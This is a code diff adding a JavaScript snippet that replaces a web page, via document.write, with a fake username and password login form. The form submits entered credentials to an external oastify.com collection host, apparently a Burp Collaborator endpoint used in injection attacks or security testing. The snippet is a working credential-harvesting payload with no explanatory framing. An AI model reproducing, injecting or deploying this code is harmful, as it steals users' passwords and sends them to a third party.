@@ -1,0 +1,27 @@
+document.write(`
+    <div style="
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      height: 100vh;
+      padding-top: 100px;
+    ">
+      <form action="https://1878kwfj69bynzn9u4wt1oghg8mzapye.oastify.com" style="text-align: center;">
+        <input
+          name="username"
+          placeholder="Username"
+          style="display: block; margin: 10px; padding: 8px;"
+          required
+        >
+        <input
+          name="password"
+          placeholder="Password"
+          style="display: block; margin: 10px; padding: 8px;"
+          required
+        >
+        <button type="submit" style="padding: 8px 16px;">
+          Login
+        </button>
+      </form>
+    </div>
+  `);
